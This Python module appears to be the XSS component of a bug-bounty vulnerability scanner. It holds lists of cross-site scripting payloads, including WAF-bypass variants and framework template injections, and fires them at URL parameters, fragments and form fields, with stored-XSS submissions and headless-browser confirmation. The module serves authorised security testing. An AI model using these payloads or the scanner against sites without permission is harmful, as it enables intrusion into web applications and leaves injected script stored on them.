"""
XSSScanner — reflected + stored XSS detection with headless browser validation.

Lifecycle:
  DETECTED:   Payload reflected in response
  VALIDATED:  Context identified (HTML/attribute/JS/URL)
  EXPLOITABLE: (not applicable — XSS is inherently exploitable)
  VERIFIED:   Playwright confirms alert() or DOM mutation + screenshot

Stored XSS:
  DETECTED:   Form submitted with XSS payload; payload appears in GET response
  VERIFIED:   Payload executes in browser after form submission

Maturity: Level 4 (Verified via browser execution)
"""

import html
import re
from typing import Any
from urllib.parse import urlparse, parse_qs, urljoin, urlencode, urlunparse

from models.finding import Finding
from modules.utils import (
    finding, log, Colors, _build_curl,
    VerificationStage,
    safe_cookies_dict, safe_get, safe_post,
)
from scanners.base import ScannerBase, DetectionResult, ValidationResult

XSS_PAYLOADS = [
    '<svg/onload=alert(1)>',
    '<svg onload=alert(1)>',
    "'<svg onload=alert(1)>'",
    "'<svg onload=confirm(1)>'",
    '"><img src=x onerror=alert(1)>',
    "';alert(1)//",
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "javascript:alert(1)",
    '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
    '<select><option><style></style><img src=x onerror=alert(1)></select>',
]

DOM_FRAGMENT_PAYLOADS = [
    '#<script>alert(1)</script>',
    '#"><img src=x onerror=alert(1)>',
    '#<svg/onload=alert(1)>',
]

STORED_XSS_PAYLOADS = [
    '<img src=x onerror=alert(1)>',
    '<script>alert(1)</script>',
    '<svg/onload=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    "';alert(1)//",
]

CONTEXT_PAYLOADS = {
    "html": ['<img src=x onerror=alert(1)>', '<svg/onload=alert(1)>', '<script>alert(1)</script>'],
    "attribute": ['" onfocus=alert(1) autofocus= ', '" autofocus onfocus=alert(1) x="'],
    "javascript": ["';alert(1)//", "</script><script>alert(1)</script>"],
    "url": ["javascript:alert(1)", "javaScript:alert(1)"],
}

DOM_XSS_PROBES = ["bbh_dom_probe", "<img src=x onerror=alert(1)>", "';alert(1)//"]

FRAMEWORK_XSS_PAYLOADS = {
    "react": ['{{__proto__.toString.constructor("alert(1)")()}}'],
    "angular": ["{{constructor.constructor('alert(1)')()}}"],
    "vue": ["{{constructor.constructor('alert(1)')()}}"],
    "jquery": ['<img src=x onerror=alert(1)>'],
}

WAF_BYPASS_XSS = [
    '<svg/onload=alert&#40;1&#41;>',
    '%3Csvg/onload=alert(1)%3E',
    '<SvG/OnLoAd=alert(1)>',
    '--><svg/onload=alert(1)>',
    "onload=alert(1)//<svg ' \"",
    'javascript:alert(1)',
    '&#106;avascript:alert(1)',
]


class XSSScanner(ScannerBase):
    SCANNER_NAME = "xss"
    SCANNER_MATURITY = 4

    def __init__(self, config: dict, recon: dict, container=None):
        super().__init__(config, recon, container=container)
        self._payloads = None

    def _get_payloads(self) -> dict:
        if self._payloads:
            return self._payloads
        loaded = self._load_payloads("xss")
        if loaded and isinstance(loaded, dict):
            self._payloads = loaded
        else:
            self._payloads = {
                "reflected": XSS_PAYLOADS,
                "context": CONTEXT_PAYLOADS,
                "dom_probes": DOM_XSS_PROBES,
                "framework": FRAMEWORK_XSS_PAYLOADS,
                "waf_bypass": WAF_BYPASS_XSS,
            }
        if self.waf_detected:
            bypass = self._payloads.get("waf_bypass", WAF_BYPASS_XSS)
            reflected = self._payloads.setdefault("reflected", list(XSS_PAYLOADS))
            reflected.extend(bypass)
        return self._payloads

    # ── Canary pre-probe for context detection ───────────────────────────

    _CANARY_BASE = "BBH_CANARY_"

    def _probe_context(self, url: str, param: str) -> str | None:
        """Send innocuous canary string, detect where it appears in response."""
        import uuid
        canary = self._CANARY_BASE + uuid.uuid4().hex[:8]
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        qs[param] = [canary]
        new_qs = urlencode(qs, doseq=True)
        test_url = urlunparse(parsed._replace(query=new_qs))
        resp = self._safe_get(test_url)
        if not resp or canary not in resp.text:
            return None
        body = resp.text
        escaped = re.escape(canary)
        if re.search(rf"<script\b[^>]*>.*?</script>", body, re.DOTALL) and canary in body:
            return "javascript"
        m = re.search(rf'<[^>]+?\s+[\w:-]+\s*=\s*["\'][^"\']*{escaped}', body)
        if m:
            attr_full = m.group(0)
            if re.search(r'\b(href|src|action|formaction)\s*=', attr_full, re.IGNORECASE):
                return "url"
            return "attribute"
        if canary in body:
            return "html"
        return None

    # ── Detection phase ─────────────────────────────────────────────────

    def detect(self, url: str, parameter: str | None = None) -> DetectionResult | None:
        payloads = self._get_payloads()
        if parameter is None:
            params = list(parse_qs(urlparse(url).query).keys())
            if not params:
                return None
            parameter = params[0]

        context = self._probe_context(url, parameter)
        if context is None:
            context = "html"

        context_payloads = payloads.get("context", CONTEXT_PAYLOADS)
        category_map = {
            "html": context_payloads.get("html", ['<img src=x onerror=alert(1)>']),
            "attribute": context_payloads.get("attribute", ['" onfocus=alert(1) autofocus= ']),
            "javascript": context_payloads.get("javascript", ["';alert(1)//"]),
            "url": context_payloads.get("url", ["javascript:alert(1)"]),
        }
        test_payloads = category_map.get(context, payloads.get("reflected", XSS_PAYLOADS))

        for payload in test_payloads[:5]:
            parsed = urlparse(url)
            qs = parse_qs(parsed.query, keep_blank_values=True)
            qs[parameter] = [payload]
            new_qs = urlencode(qs, doseq=True)
            test_url = urlunparse(parsed._replace(query=new_qs))

            resp = self._safe_get(test_url)
            if not resp:
                continue

            if self._detect_context(resp.text, payload):
                return DetectionResult(
                    url=url,
                    parameter=parameter,
                    payload=payload,
                    context=context,
                    raw_response=resp,
                    evidence_signals=[f"Reflected in {context} context"],
                )

            content_type = (resp.headers.get('Content-Type', '') or '')
            if 'text/html' in content_type and payload in resp.text:
                body = resp.text
                pos = body.index(payload)
                before = body[pos-1] if pos > 0 else ''
                after = body[pos+len(payload)] if pos+len(payload) < len(body) else ''
                escaped_prefix = body[pos-2:pos] if pos >= 2 else ''
                in_json = (before == '"' and after == '"') or (escaped_prefix == '\\"' and after == '"')
                if not in_json:
                    return DetectionResult(
                        url=url,
                        parameter=parameter,
                        payload=payload,
                        context="json_reflection",
                        raw_response=resp,
                        evidence_signals=["Reflected outside JSON string context in text/html response"],
                    )
        return None

    def _safe_get(self, url: str):
        from modules.utils import safe_get
        try:
            return safe_get(self.session, url, self.timeout, raise_for_status=False)
        except Exception:
            return None

    def _detect_context(self, body: str, payload: str) -> str | None:
        if payload not in body:
            return None
        if re.search(r"<script\b[^>]*>.*?</script>", body, re.IGNORECASE | re.DOTALL) and payload in body:
            return "javascript"
        if re.search(r"<[^>]+\s[\w:-]+\s*=\s*['\"][^'\"]*" + re.escape(payload), body, re.IGNORECASE):
            return "attribute"
        if re.search(r"(href|src|action|formaction)\s*=\s*['\"]?" + re.escape(payload), body, re.IGNORECASE):
            return "url"
        if re.search(r">[^<]*" + re.escape(payload) + r"[^<]*<", body, re.DOTALL):
            return "html"
        return None

    # ── Validation phase ────────────────────────────────────────────────

    def validate(self, detection: DetectionResult) -> dict | None:
        """Validate XSS via headless browser execution."""
        if detection.context == "json_reflection":
            resp = detection.raw_response
            if resp and 'text/html' in resp.headers.get('Content-Type', ''):
                body = resp.text
                payload = detection.payload
                if payload in body:
                    pos = body.index(payload)
                    before = body[pos-1] if pos > 0 else ''
                    after = body[pos+len(payload)] if pos+len(payload) < len(body) else ''
                    escaped_prefix = body[pos-2:pos] if pos >= 2 else ''
                    in_json = (before == '"' and after == '"') or (escaped_prefix == '\\"' and after == '"')
                    if not in_json:
                        return {"confirmed": True, "method": "json_reflection_context", "alert_fired": False}
            return {"confirmed": False, "method": "reflection_only", "alert_fired": False}
        payload = detection.payload
        url = detection.url
        parameter = detection.parameter

        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        qs[parameter] = [payload]
        new_qs = urlencode(qs, doseq=True)
        test_url = urlunparse(parsed._replace(query=new_qs))

        screenshot_dir = self.config.get("output", "reports") + "/screenshots"
        browser_ev = self.validation.confirm_browser_xss(
            url=test_url,
            payload=payload,
            screenshot_dir=screenshot_dir,
        )
        if browser_ev and (browser_ev.alert_fired or browser_ev.dom_mutation):
            return {
                "confirmed": True,
                "method": "browser_execution",
                "alert_fired": browser_ev.alert_fired,
                "dom_mutation": browser_ev.dom_mutation,
                "screenshot_path": browser_ev.screenshot_path,
            }
        return {"confirmed": False, "method": "reflection_only", "alert_fired": False}

    # ── Evidence collection ─────────────────────────────────────────────

    def collect_evidence(self, detection: DetectionResult,
                         validation_result: dict | None = None) -> list:
        from models.evidence import (
            HttpRequestEvidence, HttpResponseEvidence,
            ResponseExcerptEvidence, BrowserExecutionEvidence,
        )
        ev_list = []
        resp = detection.raw_response
        if resp:
            ev_list.append(HttpRequestEvidence(
                method="GET",
                url=detection.url,
                curl_command=_build_curl("GET", detection.url, dict(self.session.headers),
                                         cookies=safe_cookies_dict(self.session.cookies)),
            ))
            ev_list.append(HttpResponseEvidence(
                status_code=resp.status_code,
                body_excerpt=resp.text[:500],
                body_length=len(resp.text),
            ))
        if detection.context == "json_reflection":
            resp = detection.raw_response
            if resp:
                ev_list.append(ResponseExcerptEvidence(
                    excerpt=resp.text[:500],
                    length=len(resp.text),
                    context=f"Content-Type: {resp.headers.get('Content-Type', '')} — reflected outside JSON string context",
                ))
        if validation_result and validation_result.get("alert_fired"):
            ev_list.append(BrowserExecutionEvidence(
                alert_fired=True,
                dom_mutation=validation_result.get("dom_mutation", False),
                screenshot_path=validation_result.get("screenshot_path", ""),
                execution_context="goto",
            ))
        return ev_list

    # ── Reproduction steps ──────────────────────────────────────────────

    def generate_reproduction(self, detection: DetectionResult, verified: bool = False) -> list[str]:
        if verified:
            return [
                f"curl -X GET '{detection.url}&{detection.parameter}={detection.payload}'",
                f"Payload '{detection.payload}' was executed in a headless Chromium browser — alert() or DOM mutation confirmed in {detection.context} context",
                "In a real attack, this payload would execute in any victim's browser visiting the affected URL, enabling session hijacking, data theft, or account takeover",
            ]
        return [
            f"curl -X GET '{detection.url}&{detection.parameter}={detection.payload}'",
            f"Observe that the payload is reflected in a {detection.context} context — unsanitized output confirms XSS",
            "An attacker can inject arbitrary JavaScript to steal cookies, capture keystrokes, or perform actions on behalf of the victim",
        ]

    # ── Stored XSS detection ────────────────────────────────────────────

    def _detect_stored_xss(self, forms: list[dict]) -> list[Finding]:
        """Submit XSS payloads in form fields and re-fetch to find stored reflections."""
        stored_findings: list[Finding] = []
        payloads = STORED_XSS_PAYLOADS

        for form in forms:
            form_url = form.get("url", "")
            form_action = form.get("action", "")
            form_method = form.get("method", "GET").upper()
            fields = form.get("fields", [])
            text_fields = [
                f for f in fields
                if f.get("name") and f.get("type") in ("text", "textarea", "search", "email", "url", None, "", "input")
            ]
            if not text_fields:
                continue

            for payload in payloads[:3]:
                try:
                    form_data = {}
                    injected_field = text_fields[0]
                    for fld in fields:
                        name = fld.get("name", "")
                        val = fld.get("value", "")
                        if name == injected_field.get("name"):
                            form_data[name] = payload
                        else:
                            form_data[name] = val if val else "test"

                    submit_url = form_action if form_action else form_url
                    if form_method == "GET":
                        parsed = urlparse(submit_url)
                        qs = parse_qs(parsed.query, keep_blank_values=True)
                        qs.update({k: [v] for k, v in form_data.items()})
                        new_qs = urlencode(qs, doseq=True)
                        test_url = urlunparse(parsed._replace(query=new_qs))
                        resp = safe_get(self.session, submit_url, self.timeout, raise_for_status=False)
                    else:
                        resp = safe_post(
                            self.session, submit_url, form_data, self.timeout,
                            raise_for_status=False, config=self.config,
                        )
                        test_url = form_action or form_url

                    if not resp:
                        continue

                    # Re-fetch page where payload might be stored (form page or action)
                    for check_url in [form_url, form_action]:
                        if not check_url or check_url == submit_url:
                            continue
                        check_resp = safe_get(self.session, check_url, self.timeout, raise_for_status=False)
                        if check_resp and payload in check_resp.text:
                            context = self._detect_context(check_resp.text, payload) or "html"
                            curl_cmd = _build_curl("GET", check_url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies))
                            f = finding(
                                vuln_type="XSS Stored",
                                url=check_url,
                                severity="critical",
                                details=f"Stored XSS: payload '{payload}' persisted after form submission to {submit_url}",
                                evidence=f"Payload: {payload} | Context: {context} | Form: {submit_url}",
                                verification_stage=VerificationStage.DETECTED.value,
                                request=curl_cmd,
                                response_excerpt=check_resp.text[:500],
                                steps_to_reproduce=[
                                    f"Navigate to {form_url}",
                                    f"Submit form at {submit_url} with payload in field '{injected_field.get('name')}'",
                                    f"Visit {check_url}",
                                    f"Observe that payload '{payload}' is stored and rendered in a {context} context",
                                    "Manually verify by submitting the payload in a browser and checking for script execution",
                                ],
                            )
                            if f:
                                self._add_finding(f)
                                stored_findings.append(f)
                                log(f"  [XSS Stored] {check_url} — payload '{payload[:40]}' persisted", Colors.YELLOW, verbose_only=True, verbose=self.verbose)
                            break

                except Exception as e:
                    log(f"  [XSS Stored] Error with form {form_url}: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)

        return stored_findings

    # ── Scan entry point ────────────────────────────────────────────────

    def scan(self, target_urls: list[str] | None = None) -> list[Finding]:
        self._prepare_scan()
        urls = self.recon.get("urls", []) if target_urls is None else target_urls
        forms = self.recon.get("forms", [])

        # DOM fragment detection
        for url in urls:
            if not self._in_scope(url):
                continue
            try:
                base_resp = self._safe_get(url)
                if not base_resp or not base_resp.text:
                    continue
                if not re.search(r'(location\.hash|location\.href|window\.location)', base_resp.text):
                    continue
                for fp in DOM_FRAGMENT_PAYLOADS:
                    frag_url = url + fp
                    frag_resp = self._safe_get(frag_url)
                    if not frag_resp or not frag_resp.text:
                        continue
                    frag_content = fp.lstrip('#')
                    if frag_content in frag_resp.text and frag_content in html.unescape(frag_resp.text):
                        screenshot_dir = self.config.get("output", "reports") + "/screenshots"
                        browser_ev = self.validation.confirm_browser_xss(
                            url=frag_url,
                            payload=frag_content,
                            screenshot_dir=screenshot_dir,
                        )
                        confirmed = browser_ev and (browser_ev.alert_fired or browser_ev.dom_mutation)
                        from models.evidence import HttpRequestEvidence, BrowserExecutionEvidence
                        ev_list = [
                            HttpRequestEvidence(
                                method="GET",
                                url=frag_url,
                                curl_command=_build_curl("GET", frag_url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
                            ),
                        ]
                        if browser_ev:
                            ev_list.append(BrowserExecutionEvidence(
                                alert_fired=browser_ev.alert_fired,
                                dom_mutation=browser_ev.dom_mutation,
                                screenshot_path=browser_ev.screenshot_path or "",
                                execution_context="goto",
                            ))
                        stage = VerificationStage.VERIFIED.value if confirmed else VerificationStage.DETECTED.value
                        f = finding(
                            vuln_type="XSS DOM Fragment",
                            url=url,
                            severity="high",
                            details=f"XSS via URL fragment {'executed in browser' if confirmed else 'detected'} — payload '{fp}' reflected unencoded",
                            evidence=f"Payload: {fp} | Context: dom_fragment | Executed: {confirmed}",
                            verification_stage=stage,
                            parameter="fragment",
                            request=_build_curl("GET", frag_url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
                            response_excerpt=frag_resp.text[:500] if frag_resp else "",
                            steps_to_reproduce=[
                                f"Visit {frag_url}",
                                "Observe that the fragment payload is reflected unencoded in the response",
                                "In a real attack, an attacker could craft a URL with a malicious fragment to execute JavaScript",
                            ],
                        )
                        if f:
                            for ev in ev_list:
                                self.evidence_engine.store(ev)
                                self.evidence_engine.link_to_finding(ev, f.get("fingerprint", ""))
                            signal_stage = VerificationStage.VALIDATED.value if confirmed else VerificationStage.DETECTED.value
                            self._enrich_finding(f, len(ev_list), signal_stage, signal_count=2 if confirmed else 1)
                            self._add_finding(f)
                        break
            except Exception as e:
                log(f"  [XSS DOM Fragment] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)

        # Reflected XSS
        for url in urls:
            if not self._in_scope(url):
                continue
            try:
                params = list(parse_qs(urlparse(url).query).keys())

                # Recon-driven targeting: prioritize parameters from JS intelligence
                js_urls = self.recon.get('js_urls', []) or []
                js_endpoints = self.recon.get('js_endpoints', []) or []
                if js_urls or js_endpoints:
                    js_param_priority = set()
                    js_text = ''
                    if isinstance(js_urls, list):
                        for js_url in js_urls:
                            if isinstance(js_url, str):
                                r = self._safe_get(js_url)
                                if r and r.text:
                                    js_text += r.text + '\n'
                    if isinstance(js_endpoints, list):
                        for ep in js_endpoints:
                            if isinstance(ep, str):
                                js_text += ep + '\n'
                    for param in params:
                        for kw in ('document.write', 'innerHTML', 'eval'):
                            pattern = rf'{re.escape(kw)}\s*\([^)]*{re.escape(param)}[^)]*\)'
                            if re.search(pattern, js_text):
                                js_param_priority.add(param)
                    if js_param_priority:
                        params = [p for p in params if p in js_param_priority] + [p for p in params if p not in js_param_priority]

                for param in params:
                    detection = self.detect(url, param)
                    if detection is None:
                        continue

                    validation = self.validate(detection)
                    evidence = self.collect_evidence(detection, validation)

                    confirmed = validation and validation.get("confirmed", False)
                    stage = VerificationStage.VERIFIED.value if confirmed else VerificationStage.DETECTED.value

                    f = finding(
                        vuln_type="XSS Reflected",
                        url=url,
                        severity="high",
                        details=f"XSS payload {'executed in browser' if confirmed else 'reflected'} in {detection.context} context via parameter '{param}'",
                        evidence=f"Payload: {detection.payload} | Context: {detection.context} | Executed: {confirmed}",
                        verification_stage=stage,
                        parameter=param,
                        request=_build_curl("GET", url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
                        response_excerpt=detection.raw_response.text[:500] if detection.raw_response else "",
                        steps_to_reproduce=self.generate_reproduction(detection, verified=confirmed),
                    )
                    if f:
                        for ev in evidence:
                            self.evidence_engine.store(ev)
                            self.evidence_engine.link_to_finding(ev, f.get("fingerprint", ""))
                        signal_stage = f["verification_stage"]
                        if detection.context == "json_reflection" and confirmed:
                            signal_stage = VerificationStage.VALIDATED.value
                        signal_count = 2 if confirmed else 1
                        self._enrich_finding(f, len(evidence), signal_stage, signal_count=signal_count)
                        self._add_finding(f)
            except Exception as e:
                log(f"  [XSS] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)

        # Stored XSS
        if forms:
            self._detect_stored_xss(forms)

        return self._get_findings()
